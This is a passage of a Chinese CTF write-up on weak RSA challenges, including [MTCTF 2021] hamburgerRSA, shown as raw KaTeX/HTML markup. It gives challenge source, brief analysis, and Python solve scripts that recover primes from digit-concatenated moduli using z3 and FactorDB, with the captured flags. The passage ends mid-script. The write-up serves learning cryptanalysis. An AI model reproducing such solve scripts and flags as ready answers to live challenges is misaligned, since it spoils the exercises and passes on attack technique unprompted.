vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>h</mi></msub><mtext>å’Œ</mtext><msub><mi>p</mi><mi>l</mi></msub><mtext>éƒ½æ˜¯</mtext><mn>200</mn><mtext>ä½çš„</mtext><mo separator="true">,</mo><mtext>æ‰€ä»¥</mtext><mi>n</mi><mtext>ç¬¬ä¸€é¡¹å¤§çº¦</mtext><mn>800</mn><mtext>ä½</mtext></mrow><annotation encoding="application/x-tex">p_hå’Œp_léƒ½æ˜¯200ä½çš„,æ‰€ä»¥nç¬¬ä¸€é¡¹å¤§çº¦800ä½</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">å’Œ</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">éƒ½</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord cjk_fallback">ä½</span><span class="mord cjk_fallback">çš„</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">æ‰€</span><span class="mord cjk_fallback">ä»¥</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">ç¬¬</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">é¡¹</span><span class="mord cjk_fallback">å¤§</span><span class="mord cjk_fallback">çº¦</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord cjk_fallback">ä½</span></span></span></span></p><p>å¯ä»¥å¾—ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>p</mi><mi>h</mi></msub><mo>âˆ—</mo><msub><mi>p</mi><mi>l</mi></msub><msub><mo stretchy="false">)</mo><mi>h</mi></msub><mo>=</mo><mfrac><mi>n</mi><mrow><mn>1</mn><msup><mn>0</mn><mn>600</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><msub><mi>p</mi><mi>h</mi></msub><mo>âˆ—</mo><msub><mi>p</mi><mi>l</mi></msub><msub><mo stretchy="false">)</mo><mi>l</mi></msub><mo>=</mo><mi>n</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p_h*p_l)_h=\frac{n}{10^{600}} \\(p_h*p_l)_l=n\quad mod(10^{200})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>h</mi></msub><mo>âˆ—</mo><msub><mi>p</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">p_h*p_l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>çš„é«˜200ä½å’Œä½200ä½</p><p>ä¹Ÿå°±å¾—åˆ°äº†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>h</mi></msub><mo>âˆ—</mo><msub><mi>p</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">p_h*p_l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>ç»“åˆnçš„è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ±‚è§£äºŒå…ƒæ–¹ç¨‹ç»„äº†</p><h2 id="exp-12"><a class="markdownIt-Anchor" href="#exp-12"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-number">182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span><br>n = <span class="hljs-number">438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span><br>e = <span class="hljs-number">0x10001</span><br><br>pqh = n // <span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">600</span>)<br>pql = n % <span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>)<br>pq = pqh*<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>) + pql<br><br>n -= <span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">400</span>)*pq + pq<br><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>h=Int(<span class="hljs-string">&#x27;h&#x27;</span>)<br>l=Int(<span class="hljs-string">&#x27;l&#x27;</span>)<br>s=Solver()<br>s.add(h*l==pq)<br>s.add(<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>)*h*h+<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>)*l*l==n)<br>s.check()<br>s=s.model()<br>h=s[s.decls()[<span class="hljs-number">0</span>]].as_long()<br>l=s[s.decls()[<span class="hljs-number">1</span>]].as_long()<br>p = h*<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>) + l<br>q = l*<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>) + h<br><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(long_to_bytes(powmod(c, d, p*q)))<br><span class="hljs-comment">#b&#x27;CMISCCTF&#123;easy_math_game_hhhhhhh&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;easy_math_game_hhhhhhh&#125;</span><br></code></pre></td></tr></table></figure><h1 id="mtctf-2021hamburgerrsa"><a class="markdownIt-Anchor" href="#mtctf-2021hamburgerrsa"></a> [MTCTF 2021]hamburgerRSA</h1><h2 id="é¢˜ç›®-13"><a class="markdownIt-Anchor" href="#é¢˜ç›®-13"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read()<br>nbit = <span class="hljs-number">64</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p, q = getPrime(nbit), getPrime(nbit)<br>    PP = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q))<br>    QQ = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p))<br>    <span class="hljs-keyword">if</span> isPrime(PP) <span class="hljs-keyword">and</span> isPrime(QQ):<br>        <span class="hljs-keyword">break</span><br><br>n = PP * QQ<br>m = bytes_to_long(flag.encode())<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">65537</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-comment">#n = 177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span><br><span class="hljs-comment">#c = 47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-13"><a class="markdownIt-Anchor" href="#åˆ†æ-13"></a> åˆ†æ</h2><p>åŸç†åŒä¸Šé¢˜</p><p>64ä½çš„åè¿›åˆ¶å¤§çº¦19-20ä½</p><p>p*qå¤§çº¦38ä½ï¼Ÿ</p><p>ï¼ˆä½†æ˜¯æˆ‘è¿˜æ˜¯ä¸å’‹ç†è§£</p><h2 id="exp-13"><a class="markdownIt-Anchor" href="#exp-13"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits<br><span class="hljs-keyword">from</span> factordb.factordb <span class="hljs-keyword">import</span> FactorDB<br>n = <span class="hljs-number">177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span><br>c = <span class="hljs-number">47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span><br>e = <span class="hljs-number">65537</span><br><br>pqh = <span class="hljs-built_in">str</span>(n)[:<span class="hljs-number">19</span>]<br>pql = <span class="hljs-built_in">str</span>(n)[-<span class="hljs-number">18</span>:]<br><br><span class="hljs-keyword">for</span> i,j <span class="hljs-keyword">in</span> product(digits, repeat=<span class="hljs-number">2</span>):<br>    pq = pqh + i + j + pql<br>    tp = FactorDB(<span class="hljs-built_in">int</span>(pq))<br>    tp.connect()<br>    tp=tp.get_factor_list()<br>    <span class="hljs-keyword">if</span> tp <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(tp) == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> tp[<span class="hljs-number">0</span>].bit_length() == <span class="hljs-number">64</span>:<br>        p, q = tp<br>        <span class="hljs-keyword">break</span><br>PP = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q))<br>QQ = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p))<br><br>d = invert(<span class="hljs-number">0x10001</span>, (PP-<span class="hljs-number">1</span>)*(QQ-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(powmod(c, d, n)))<br><span 